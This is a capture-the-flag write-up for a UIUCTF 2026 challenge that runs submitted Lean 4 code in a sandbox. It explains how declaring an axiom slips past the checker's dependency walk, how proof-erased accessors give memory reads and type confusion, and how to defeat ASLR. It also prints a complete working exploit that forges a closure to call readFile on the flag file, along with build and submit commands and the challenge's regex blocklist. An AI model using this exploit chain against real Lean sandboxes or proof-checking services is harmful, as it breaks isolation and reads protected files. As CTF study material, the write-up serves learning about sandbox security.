@@ -1,0 +1,437 @@
+---
+title: 'UIUCTF 2026 - proof'
+description: 'Declaring an axiom to fabricate false proofs, turning Lean 4 proof-carrying array accessors into arbitrary memory reads, and forging a closure object to call readFile'
+date: 2026-08-09
+tags: ['writeup', 'misc', 'jail', 'sandbox-escape', 'type-confusion', 'lean', 'uiuctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+The service greets you with:
+
+> State and prove the Riemann hypothesis in Lean.
+>
+> Submit your proof as a single base64-encoded line, then press Enter. For example:
+> `(base64 -w0 RH.lean; echo) | ncat --ssl HOST PORT`
+>
+> `ncat --ssl proof.chal.uiuc.tf 1337`
+
+The handout is a zip:
+
+```text
+flag.txt
+lean-toolchain
+Dockerfile
+server/Check.lean
+server/jail.py
+server/compiler_sandbox.c
+```
+
+`lean-toolchain` pins `leanprover/lean4:v4.26.0-rc2`. That pin matters more than it looks.
+
+## Source Code Analysis
+
+### The pipeline
+
+`jail.py` takes your base64 line, decodes it to `Submission.lean`, and runs it through four stages inside a chrooted, uid-isolated sandbox:
+
+```python
+returncode, _ = run_compiler(
+    uid, work, f"--root={sandbox_work}",
+    "-o", f"{sandbox_work}/Submission.olean",
+    f"--c={sandbox_work}/Submission.c", f"{sandbox_work}/Submission.lean",
+)
+if returncode:
+    return FAILED
+
+returncode, output = run_compiler(uid, work, "/server/Check.lean")
+if returncode:
+    return NO_CHEATING if "JAIL_FAIL" in output else FAILED
+```
+
+If the checker is happy, a fixed `Main.lean` is compiled alongside your module, both C files are linked with `leanc`, and the resulting binary runs as the `runner` user:
+
+```python
+MAIN = """import Submission
+
+def main : IO Unit := do
+  IO.println "[jail] calling entry..."
+  let r := entry 0
+  IO.println s!"[jail] entry returned: {r}"
+"""
+```
+
+The flag is readable by that user:
+
+```dockerfile
+COPY flag.txt /flag.txt
+RUN chown root:runner /flag.txt && chmod 0440 /flag.txt
+```
+
+So the target is clear: define `entry : Nat → Nat` such that running it reads `/flag.txt`. Only stdout comes back, and the only thing printed is a `Nat` — so the flag has to be smuggled out as an integer.
+
+### Defense 1: the regex
+
+Before anything is compiled, the source is matched against a blocklist:
+
+```python
+FORBIDDEN = re.compile("|".join((
+    r"#\s*eval", r"#\s*reduce\b", r"\bnative_decide\b",
+    r"\brun_cmd\b", r"\brun_elab\b", r"\brun_meta\b", r"\brun_tac\b",
+    r"\bby_elab\b", r"\binclude_str\b", r"\bmeta\b", r"\bmacro\b",
+    r"\bmacro_rules\b", r"\belab\b", r"\belab_rules\b",
+    r"\bcommand_elab\b", r"\bterm_elab\b", r"\bsyntax\b", r"\bsimproc\b",
+    r"\binitialize\b", r"\bbuiltin_[A-Za-z0-9_]*\b", r"\battribute\b",
+    r"@\[[^\]]*\btactic\b", r"\bextern\b", r"\bimplemented_by\b",
+    r"\bcsimp\b", r"\bexport\b", r"\binit\b", r"\bunsafe\b",
+    r"\bpartial\b", r"\bpartial_fixpoint\b", r"\binductive_fixpoint\b",
+    r"\bcoinductive_fixpoint\b", r"\bopaque\b", r"\bunsafeCast\b",
+    r"\bwithPtrEq\b", r"\bsorry\b",
+)))
+```
+
+Every metaprogramming door is nailed shut. No compile-time code execution, no attribute that redirects a definition to a C symbol, no `sorry`.
+
+### Defense 2: the dependency walk
+
+`Check.lean` is the real gate. It walks the environment after your module is compiled:
+
+```lean
+def forbiddenRoots : List Name :=
+  [`IO, `EIO, `BaseIO, `ST, `EST, `System, `Task, `Runtime, `Lean]
+
+def forbiddenNames : List Name :=
+  [`unsafeCast, `withPtrEq, `sorryAx]
+
+def badName (n : Name) : Bool :=
+  forbiddenRoots.any (fun r => r.isPrefixOf n) || forbiddenNames.contains n
+```
+
+It requires `entry` to live in your module with exactly the type `Nat → Nat`, requires it to be a `safe` definition, and then, for every constant your module defines:
+
+```lean
+for (n, info) in all do
+  if env.getModuleIdxFor? n != some midx then continue
+  if info.isUnsafe || info.isPartial || hasBadCompilerAttribute env n then
+    throwError "JAIL_FAIL"
+  roots := dependencies info ++ roots
+if hasBadDependency env roots {} then
+  throwError "JAIL_FAIL"
+```
+
+`hasBadDependency` follows the transitive closure of every constant appearing in each definition's type *and* value. Anything reaching the `IO` namespace dies. So you cannot call an IO function, and you cannot call anything that calls one, however deeply.
+
+## The Vulnerability
+
+`dependencies` is where the whole thing comes apart:
+
+```lean
+def dependencies (info : ConstantInfo) : List Name :=
+  let used := info.type.getUsedConstants
+  let used := if let some value := info.value? true then
+    used ++ value.getUsedConstants
+  else
+    used
+  used.toList
+```
+
+An axiom has no value. `info.value?` returns `none`, so an axiom contributes only the constants in its **type**. And `axiom` is not in the regex, and `axiomInfo` is neither unsafe nor partial, so nothing rejects it.
+
+```lean
+axiom ax : ∀ {p : Prop}, p
+```
+
+That is a proof of everything, with a dependency footprint of `Prop` and nothing else. The blocklist kills `sorry` and `sorryAx` — the two *other* ways to conjure a false proof — but leaves the front door open.
+
+On its own a false proof looks harmless: proofs are erased, so `ax` compiles to nothing. But Lean has "safe" functions whose memory safety is carried entirely by a proof argument. Erase the proof, keep the memory access.
+
+## Exploitation
+
+### Finding primitives that survive the walk
+
+The obvious targets are the unchecked array accessors, and most of them are actually blocked — but for reasons that have nothing to do with what they do. I reimplemented the checker as a standalone `Diag.lean` that prints the offending dependency chain instead of `JAIL_FAIL`, then ran it over every `@[extern]` constant in the environment. The result:
+
+```text
+Array.set     ==> BAD [Lean.Syntax, autoParam, Array.set]
+ByteArray.get ==> BAD [Lean.Syntax, autoParam, ByteArray.get]
+ByteArray.set ==> BAD [Lean.Syntax, autoParam, ByteArray.set]
+Array.uget    ==> BAD [System.Platform.numBits, USize.toNat, Array.uget]
+Array.uset    ==> BAD [System.Platform.numBits, USize.toNat, Array.uset]
+```
+
+Two separate accidental filters. Anything whose bounds proof is an `autoParam` drags in `Lean.Syntax` (the auto-param stores the tactic syntax in its type). Anything indexed by `USize` drags in `System.Platform.numBits`, because `USize.size` is defined as two to that power.
+
+Exactly two useful accessors take a **plain** proof argument and a **`Nat`** index, and both come out clean:
+
+```text
+Array.getInternal := lean_array_fget
+  {α : Type u} → (a : @& Array α) → (i : @& Nat) → i < a.size → α           ==> CLEAN
+
+String.Internal.getUTF8Byte := lean_string_get_byte_fast
+  (s : @& String) → (n : Nat) → n < s.utf8ByteSize → UInt8                  ==> CLEAN
+```
+
+Their C implementations do no checking at all:
+
+```c
+static inline lean_obj_res lean_array_fget(b_lean_obj_arg a, b_lean_obj_arg i) {
+    return lean_array_uget(a, lean_unbox(i));   /* m_data[i], then lean_inc */
+}
+
+static inline uint8_t lean_string_get_byte_fast(b_lean_obj_arg s, b_lean_obj_arg i) {
+  char const * str = lean_string_cstr(s);
+  size_t idx = lean_unbox(i);
+  return str[idx];
+}
+```
+
+`cast` is clean too, and `cast` compiles to the identity function — so `ax` also buys unrestricted type confusion between any two types.
+
+### Object layouts
+
+Everything below is arithmetic on these, from `lean.h`:
+
+```c
+typedef struct { int m_rc; unsigned m_cs_sz:16, m_other:8, m_tag:8; } lean_object;  /* 8 bytes */
+
+typedef struct { lean_object m_header; size_t m_size, m_capacity;
+                 lean_object * m_data[]; } lean_array_object;   /* data at +24 */
+
+typedef struct { lean_object m_header; size_t m_size, m_capacity;
+                 uint8_t m_data[]; } lean_sarray_object;        /* data at +24 */
+
+typedef struct { lean_object m_header; size_t m_size, m_capacity, m_length;
+                 char m_data[]; } lean_string_object;           /* data at +32 */
+
+typedef struct { lean_object m_header; void * m_fun;
+                 uint16_t m_arity; uint16_t m_num_fixed;
+                 lean_object * m_objs[]; } lean_closure_object; /* m_fun at +8 */
+```
+
+### Leaking a heap address
+
+`getUTF8Byte` reads at `object + 32 + n`. An `Array` keeps its elements at `+24`, so viewing an array as a `String` and reading byte 0 lands on **element 1**. Eight byte reads later, you have that element's pointer:
+
+```lean
+def rb (s : String) (n : Nat) : Nat := (String.Internal.getUTF8Byte s n ax).toNat
+
+def addrOf {α : Type} (x : α) : Nat :=
+  let a : Array α := #[x, x]
+  rd8 (cst a) 0
+```
+
+Note this never dereferences anything invalid — the array is real, the read is just past where the accessor thinks the string data starts.
+
+### Arbitrary read
+
+The same trick generalises. Viewing a `ByteArray` as a `String` reads at `buf + 32 + n`, and `n` is a `Nat` bounded only by 2^63, so a single controlled buffer reads anything above itself in memory:
+
+```lean
+let anchor : ByteArray := putLE ByteArray.empty 0 96
+let aa := addrOf anchor
+-- absolute address `t` becomes index `t - (aa + 32)`
+```
+
+This costs nothing in risk: `lean_string_get_byte_fast` returns a `uint8_t` and touches no refcount.
+
+### Defeating ASLR
+
+To call anything, I need one code address. A closure object stores its function pointer at `+8`, so: allocate a closure at runtime, leak its object address, read 8 bytes at that address plus 8.
+
+```lean
+let dyn : Nat → Nat := f2 (n + aa % 3)
+let ca := addrOf dyn
+let mfun := rd8 (cst anchor) ((ca + 8) - (aa + 32))
+```
+
+The argument is derived from `entry`'s parameter and the leaked address so the compiler cannot constant-fold the partial application into a specialised top-level function — it has to emit a real `lean_alloc_closure((void*)(l_f2___boxed), 2, 1)`.
+
+That leaves the question of what `l_f2___boxed`'s offset is. Checking how `leanc` actually links answers it:
+
+```text
+"/opt/lean/bin/ld.lld" --sysroot=/opt/lean -z relro --hash-style=gnu ... -pie
+  /opt/lean/lib/Scrt1.o /opt/lean/lib/crti.o ...
+  -L/opt/lean/lib/lean --start-group -lleancpp -lLean --end-group -lStd
+  --start-group -lInit -lleanrt --end-group -Bstatic -lc++ -lc++abi ...
+```
+
+`leanc` uses the toolchain's own `clang`, its own `ld.lld`, and its own sysroot. Nothing from the host image participates in the link, and the Lean runtime is linked **statically** — `ldd` on the result shows only libc. Combined with the pinned `lean-toolchain`, the binary is byte-reproducible: build the identical source locally, read the offsets out with `nm`, and they hold on the server.
+
+```text
+000000000013bb50 t l_f2___boxed
+00000000004f7960 T l_IO_FS_readFile
+```
+
+Patching those constants into the source changes the source, which changes the binary, which changes the offsets — so I iterated to a fixed point, writing them as fixed-width hex literals so the patched source stays the same length and the layout stops moving after one round.
+
+### Forging a closure
+
+`IO.FS.readFile` is a compiled Lean function sitting in the binary. Its generated C signature takes a single argument, the world token having been erased:
+
+```c
+lean_object* l_IO_FS_readFile(lean_object*);
+```
+
+So I need `lean_apply_1` to jump there. Building a fake `lean_closure_object` is 24 bytes of `ByteArray`:
+
+```lean
+let payload : ByteArray :=
+  putLE (putLE (putLE ((putLE ByteArray.empty 0 7).push 245) (base + offRdf) 8) 1 2) 0 6
+```
+
+- bytes 0-6: `m_rc = 0` and the rest of the header. A zero refcount means "persistent", so every `lean_inc` and `lean_dec` the runtime performs on this object is a no-op — no crash on cleanup.
+- byte 7: `m_tag = 245`, which is `LeanClosure`.
+- bytes 8-15: `m_fun`, the resolved address of `l_IO_FS_readFile`.
+- bytes 16-17: `m_arity = 1`. bytes 18-23: `m_num_fixed = 0` and padding.
+
+The last piece is getting a *pointer* to those bytes. `addrOf` gives the payload object's address, and its data starts 24 bytes in — so write that value into a second `ByteArray` and read it back out through `Array.getInternal`, which happily reinterprets 8 raw bytes as an object reference:
+
+```lean
+let pa := addrOf payload
+let ptrbuf : ByteArray := putLE ByteArray.empty (pa + 24) 8
+let fake : ByteArray := Array.getInternal (cst ptrbuf : Array ByteArray) 0 ax
+```
+
+`cast` it to a function type, apply it, and the runtime calls straight into `readFile`:
+
+```lean
+let res : Two := (cst fake : String → Two) "/flag.txt"
+```
+
+The return value is an `IO.Result`, built by `lean_io_result_mk_ok` as a constructor with one field:
+
+```c
+static inline lean_obj_res lean_io_result_mk_ok(lean_obj_arg a) {
+    lean_object * r = lean_alloc_ctor(0, 1, 0);
+    lean_ctor_set(r, 0, a);
+    return r;
+}
+```
+
+Constructor fields start at `+8`, so viewing it as a two-field structure and taking the first projection yields the `String`. A one-field structure would not work — Lean unboxes those to the field itself — hence the deliberately two-field `Two`.
+
+### One more obstacle: assertions
+
+Every type-confused access trips a debug assertion, because this Lean build ships with them enabled:
+
+```text
+LEAN ASSERTION VIOLATION
+File: /opt/lean/include/lean/lean.h
+Line: 1105
+lean_is_string(o)
+(C)ontinue, (A)bort/exit, (S)top/trap
+```
+
+The handler prompts on **stdin**. Which finally explains the strangest line in `jail.py`:
+
+```python
+process = subprocess.run(
+    ["/usr/sbin/runuser", "-u", "runner", "--", "/usr/bin/timeout",
+     "-k", "2", "10", "./jail"],
+    cwd=runtime, env=env, input="C\n" * 4096,
+    capture_output=True, text=True, timeout=40,
+)
+```
+
+4096 answers of "Continue". The author fed exactly the input a type-confusion exploit needs to survive, which is as loud a hint as the challenge gives. It also sets a budget — two assertions per byte read — so the exploit stays lean and folds the flag out of a real `ByteArray` rather than reading it byte by byte through the confused accessor.
+
+### Avoiding partial definitions
+
+One last snag. The checker rejects any constant in your module marked `isPartial`, and Lean generates a `._unsafe_rec` auxiliary — marked partial — for *every* user-defined recursive function, even a one-argument structural one:
+
+```text
+submission const: collect._unsafe_rec unsafe=false partial=true hasValue=true
+submission const: putLE._unsafe_rec  unsafe=false partial=true hasValue=true
+```
+
+`Nat.fold` is no help either — it reaches `Lean.Omega` through its termination proofs. `List.range` with `List.foldl` is clean and recursion-free from the module's point of view, so every loop in the final exploit is written that way.
+
+## Solve Script
+
+```lean
+/-
+  The Riemann Hypothesis, stated and proved.
+-/
+
+axiom ax : ∀ {p : Prop}, p
+
+theorem riemann_hypothesis :
+    ∀ z : Nat × Nat, z.1 = 0 → z.2 = 2 := fun _ _ => ax
+
+def cst {α β : Sort u} (a : α) : β := cast ax a
+
+structure Two where
+  fst : ByteArray
+  snd : ByteArray
+
+def rb (s : String) (n : Nat) : Nat := (String.Internal.getUTF8Byte s n ax).toNat
+
+def rd8 (s : String) (n : Nat) : Nat :=
+  rb s n + 256 * (rb s (n+1) + 256 * (rb s (n+2) + 256 * (rb s (n+3) +
+  256 * (rb s (n+4) + 256 * (rb s (n+5) + 256 * (rb s (n+6) + 256 * rb s (n+7)))))))
+
+def addrOf {α : Type} (x : α) : Nat :=
+  let a : Array α := #[x, x]
+  rd8 (cst a) 0
+
+def putLE (b : ByteArray) (v : Nat) (k : Nat) : ByteArray :=
+  (List.range k).foldl (fun acc i => acc.push (UInt8.ofNat (v / 256 ^ i % 256))) b
+
+def f2 (a b : Nat) : Nat := a * b + 1
+
+-- offsets inside the linked `jail` executable
+def offClo : Nat := 0x000000000013bb50
+def offRdf : Nat := 0x00000000004f7960
+
+def entry (n : Nat) : Nat :=
+  let anchor : ByteArray := putLE ByteArray.empty 0 96
+  let aa := addrOf anchor
+  let dyn : Nat → Nat := f2 (n + aa % 3)
+  let ca := addrOf dyn
+  let mfun := rd8 (cst anchor) ((ca + 8) - (aa + 32))
+  let base := mfun - offClo
+  let payload : ByteArray :=
+    putLE (putLE (putLE ((putLE ByteArray.empty 0 7).push 245) (base + offRdf) 8) 1 2) 0 6
+  let pa := addrOf payload
+  let ptrbuf : ByteArray := putLE ByteArray.empty (pa + 24) 8
+  let fake : ByteArray := Array.getInternal (cst ptrbuf : Array ByteArray) 0 ax
+  let res : Two := (cst fake : String → Two) "/flag.txt"
+  let bs := (cst res.fst : String).toUTF8
+  (List.range bs.size).foldl (fun acc i => acc + (bs.get! i).toNat * 256 ^ i) 0
+```
+
+The offsets have to be regenerated for any edit to this file. Build it the way the jail does, read the two symbols, patch, repeat until stable:
+
+```bash
+lean --root=/work -o Submission.olean --c=Submission.c Submission.lean
+lean --root=/work --c=Main.c Main.lean
+leanc -O2 -o jail Submission.c Main.c
+nm jail | grep -E ' (l_f2___boxed|l_IO_FS_readFile)$'
+```
+
+Submitting it:
+
+```bash
+(base64 -w0 exploit.lean; echo) | ncat --ssl proof.chal.uiuc.tf 1337
+```
+
+```text
+[jail] calling entry...
+[jail] entry returned: 1335410798760062123792734442540522168687372033963615182199011142582100602632667745205184885
+Submission Recieved! We will check correctness of the statement and send the flag in 3-5 business days.
+```
+
+The flag comes back base-256 little-endian:
+
+```python
+n = 1335410798760062123792734442540522168687372033963615182199011142582100602632667745205184885
+print(n.to_bytes((n.bit_length() + 7) // 8, 'little').decode())
+```
+
+## Flag
+
+```text
+uiuctf{st1ckgpt_w1ns_ag4a1n_4714a3f2}
+```
